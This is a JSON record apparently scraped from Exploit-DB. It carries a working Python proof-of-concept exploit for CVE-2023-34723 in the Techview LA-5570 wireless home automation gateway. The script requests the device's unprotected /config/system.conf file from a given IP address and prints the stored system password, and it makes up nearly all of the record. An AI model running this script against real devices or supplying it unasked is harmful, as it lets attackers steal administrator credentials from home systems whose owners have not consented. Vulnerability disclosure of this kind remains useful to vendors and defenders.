{"source": "https://www.exploit-db.com/exploits/51720", "vulnName": "Techview LA-5570 Wireless Gateway Home Automation Controller - Multiple Vulnerabilities", "vulnEDBID": "51720", "vulnCVE": "2023-34723", "author": "THE SECURITY TEAM [EXPLOITSECURITY.IO]", "exploitType": "REMOTE", "platform": "HARDWARE", "datePublished": "2023-09-08", "vulnContent": "# Exploit Title: Techview LA-5570 Wireless Gateway Home Automation Controller - Multiple Vulnerabilities\n# Google Dork: N/A\n# Date: 25/08/2023\n# Exploit Author: The Security Team [exploitsecurity.io<http://exploitsecurity.io>]\n# Vendor Homepage: https://www.jaycar.com.au/wireless-gateway-home-automation-controller/p/LA5570\n# Software Link: N/A\n# Version: 1.0.19_T53\n# Tested on: MACOS/Linux\n# CVE : CVE-2023-34723\n# POC Code Available: https://www.exploitsecurity.io/post/cve-2023-34723-cve-2023-34724-cve-2023-34725\n\n#!/opt/homebrew/bin/python3\n\nimport requests\nimport sys\nfrom time import sleep\nfrom urllib3.exceptions import InsecureRequestWarning\nfrom colorama import init\nfrom colorama import Fore, Back, Style\nimport re\nimport os\nimport ipaddress\nrequests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)\n\ndef banner():\n    if os.name == 'posix':\n        clr_cmd = ('clear')\n    elif os.name == 'nt':\n        clr_cmd = ('cls')\n    os.system(clr_cmd)\n    print (\"[+]****************************************************[+]\")\n    print (\" | Author      : The Security Team                      |\")\n    print (\" | Company     : \"+Fore.RED+ \"Exploit Security\" +Style.RESET_ALL+\"\\t\\t\\t|\")\n    print (\" | Description : TechVIEW LA-5570 Directory Traversal   |\")\n    print (\" | Usage       : \"+sys.argv[0]+\" <target>              |\")   \n    print (\"[+]****************************************************[+]\")\n\ndef usage():\n    print (f\"Usage: {sys.argv[0]} <target>\")\n\ndef main(target):\n    domain = \"http://\"+target+\"/config/system.conf\"\n    try:\n        url = domain.strip()\n        r = requests.get(url, verify=False, timeout=3)\n        print (\"[+] Retrieving credentials\", flush=True, end='')\n        sleep(1)\n        print(\" .\", flush=True, end='')\n        sleep(1)\n        print(\" .\", flush=True, end='')\n        sleep(1)\n        print(\" .\", flush=True, end='')\n        if (\"system_password\" in r.text):\n            data =  (r.text.split(\"\\n\"))\n            print (f\"\\n{data[1]}\")\n        else:\n            print (Fore.RED + \"[!] Target is not vulnerable !\"+ Style.RESET_ALL)\n    except TimeoutError:\n        print (Fore.RED + \"[!] Timeout connecting to target !\"+ Style.RESET_ALL)\n    except KeyboardInterrupt:\n        return\n    except requests.exceptions.Timeout:\n        print (Fore.RED + \"[!] Timeout connecting to target !\"+ Style.RESET_ALL)\n        return\n        \nif __name__ == '__main__':\n    if len(sys.argv)>1:\n        banner()\n        target = sys.argv[1]\n        try:\n            validate = ipaddress.ip_address(target)\n            if (validate):\n                main (target)\n        except ValueError as e:\n            print (Fore.RED + \"[!] \" + str(e) + \" !\" + Style.RESET_ALL) \n    else:\n        print (Fore.RED + f\"[+] Not enough arguments, please specify target !\" + Style.RESET_ALL)\n            "}